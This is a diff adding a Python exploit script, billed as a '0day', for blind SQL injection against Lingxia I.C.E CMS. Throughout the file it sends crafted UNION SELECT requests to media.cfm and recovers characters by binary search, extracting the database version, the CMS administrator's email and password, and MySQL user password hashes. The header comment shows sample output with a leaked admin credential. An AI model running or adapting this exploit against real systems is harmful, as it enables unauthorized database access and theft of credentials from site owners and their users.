@@ -1,0 +1,204 @@
+#!/usr/bin/python
+# ICE CMS Blind SQLi 0day.
+# [mr_me@pluto ice]$ python icecold.py -p localhost:8080 -t 10.3.100.25:8500 -d /ice/
+# 
+# 	| ---------------------------------------------------- |
+# 	| Lingxia I.C.E CMS Remote Blind SQL Injection Exploit |
+# 	| by mr_me - net-ninja.net --------------------------- |
+#
+# (+) Exploiting target @: 10.3.100.25:8500/ice/
+# (+) Testing Proxy @ localhost:8080..
+# (+) Proxy is working!
+# (+) Using string 'icon_media_remove.gif' for the true page
+# (+) This will take time, go grab a coffee..
+#
+# (!) Getting database version: 5.5.9
+# (!) Getting database user: root@localhost
+# (!) Getting database name: ice
+# (!) Getting ICE administrative account: admin@admin.com:pa$sw0rD
+# (!) w00t! You have access to MySQL database!
+# (+) Dumping hashs hold onto your knickers..
+# (+) The username and hashed password is: root:*EE4E2773D7530819563F0DC6FCE27446A51C9413
+# (+) PoC finished.
+#
+# Note to Lingexa:
+# Next time, acknowledge a kind email.
+
+import sys, urllib, re
+from optparse import OptionParser
+
+# all possible decimal values of printable ascii characters
+# 8 requests per char, much much cleaner.
+lower_value = 0
+upper_value = 126
+#global truStr
+trueStr = "icon_media_remove.gif"
+
+vuluri = "media.cfm?session.current_site_id=1&session.user_id=99"
+basicInfo = {'version':'version()', 'user':'user()', 'name':'database()'}
+
+usage = "./%prog [<options>] -t [target] -d [directory]"
+usage += "\nExample: ./%prog -p localhost:8080 -t 192.168.2.15:8500 -d /amoeba/"
+
+parser = OptionParser(usage=usage)
+parser.add_option("-p", type="string",action="store", dest="proxy",
+                  help="HTTP Proxy <server:port>")
+parser.add_option("-t", type="string", action="store", dest="target",
+                  help="The Target server <server:port>")
+parser.add_option("-d", type="string", action="store", dest="directory",
+                  help="Directory path to the CMS")
+
+(options, args) = parser.parse_args()
+
+def banner():
+    print "\n\t| ---------------------------------------------------- |"
+    print "\t| Lingxia I.C.E CMS Remote Blind SQL Injection Exploit |"
+    print "\t| by mr_me - net-ninja.net --------------------------- |\n"
+
+if len(sys.argv) < 5:
+	banner()
+	parser.print_help()
+	sys.exit(1)
+
+def setTargetHTTP():
+	if options.target[0:7] != 'http://':
+		options.target = "http://" + options.target
+	return options.target
+	
+def getProxy():
+	try:
+		proxy = {'http': "http://"+options.proxy}
+		opener = urllib.FancyURLopener(proxy)
+	except(socket.timeout):
+		print "\n(-) Proxy Timed Out"
+		sys.exit(1)
+	except(),msg:
+		print "\n(-) Proxy Failed"
+		sys.exit(1)
+	return opener
+	
+def getServerResponse(exploit):
+	if options.proxy:
+		try:
+			options.target = setTargetHTTP()
+			opener = getProxy()
+			check = opener.open(options.target+options.directory+exploit).read()
+		except urllib.error.HTTPError, error:
+			check = error.read()
+		except socket.error:
+			print "(-) Proxy connection failed"
+			sys.exit(1)
+	else:
+		try:
+			check = urllib.urlopen(options.target+options.directory+exploit).read()
+		except urllib.error.HTTPError, error:
+			check = error.read()
+		except urllib.error.URLError:
+			print "(-) Target connection failed, check your address"
+			sys.exit(1)
+	return check
+
+# modified version of rsauron's function 
+# thanks bro. 
+def getAsciiValue(URI):
+	lower = lower_value
+        upper = upper_value
+	while lower < upper:
+		try:
+			mid = (lower + upper) / 2
+			head_URI = URI + ">"+str(mid)+"+--"
+			result = getServerResponse(head_URI)
+			match = re.findall(trueStr,result)
+			if len(match) >= 1:
+			        lower = mid + 1
+			else:
+                             	upper = mid
+		except (KeyboardInterrupt, SystemExit):
+                        raise
+                except:
+                       	pass
+
+	if lower > lower_value and lower < upper_value:
+                value = lower
+        else:
+             	head_URI = URI + "="+str(lower)
+		result = getServerResponse(head_URI)
+                match = re.findall(trueStr,result)
+                if len(match) >= 1:
+                        value = lower
+                else:
+                        print "(-) READ xprog's blind sql tutorial!\n"
+                        sys.exit(1)
+        return value
+
+def doBlindSqlInjection():
+	print "(+) Using string '%s' for the true page" % (trueStr)
+        print "(+) This will take time, go grab a coffee.."
+        for key in basicInfo:
+	        sys.stdout.write("\n(!) Getting database %s: " % (key))
+                sys.stdout.flush()
+
+                # it will never go through all 100 iterations
+                for i in range(1,100):
+                        request = (vuluri+"+union+select+1,2,3,4,5,6+from+ice_user+where+ascii(substring(%s,%s,1))" % (basicInfo[key],str(i)))
+           		asciival = getAsciiValue(request)
+                        if asciival != 0:
+                                sys.stdout.write("%s" % (chr(asciival)))
+                                sys.stdout.flush()
+                        else:
+                             	break
+	
+	sys.stdout.write("\n(!) Getting ICE administrative account: ")
+	sys.stdout.flush()
+	for i in range(1,100):
+		getUserAndPass = (vuluri+"+union+select+1,2,3,4,5,6+from+ice_user+where+ascii(substring((SELECT+concat"
+		"(email,0x3a,pword)+from+ice.ice_user+limit+0,1),%s,1))" % str(i))
+
+		asciival = getAsciiValue(getUserAndPass)
+		
+		if asciival != 0:
+			sys.stdout.write("%s" % (chr(asciival)))
+			sys.stdout.flush()
+		else:
+			pass
+		
+	isMysqlUser = (vuluri+"+union+select+1,2,3,4,5,6+from+ice_user+where+(select 1 from mysql.user limit 0,1)=1")
+        result = getServerResponse(isMysqlUser)
+        match = re.findall(trueStr,result)
+        if len(match) >= 1:
+               	print "\n(!) w00t! You have access to MySQL database!"
+                print "(+) Dumping hashs hold onto your knickers.."
+                sys.stdout.write("(+) The username and hashed password is: ")
+                sys.stdout.flush()
+                for k in range(1,100):
+                       	getMysqlUserAndPass = (vuluri+"+union+select+1,2,3,4,5,6+from+ice_user+where+ascii(substring((SELECT+concat"
+			"(user,0x3a,password)+from+mysql.user+limit+0,1),%s,1))" % str(k))
+                        asciival = getAsciiValue(getMysqlUserAndPass)
+                        if asciival != 0:
+                                sys.stdout.write("%s" % (chr(asciival)))
+                               	sys.stdout.flush()
+                        else:
+                                break
+        else:
+                print "\n(-) You do not have access to MySQL database"
+
+if __name__ == "__main__":
+	banner()
+	print "(+) Exploiting target @: %s" % (options.target+options.directory)
+	if options.proxy:
+		print "(+) Testing Proxy @ %s.." % (options.proxy)
+		opener = getProxy()
+		try:
+			check = opener.open("http://www.google.com").read()
+		except:
+			check = 0
+			pass
+		if check >= 1:
+			print "(+) Proxy is working!"
+		
+		else:
+			print "(-) Proxy failed, exiting.."
+			sys.exit(1)
+
+	doBlindSqlInjection()	
+	print "\n(+) PoC finished."
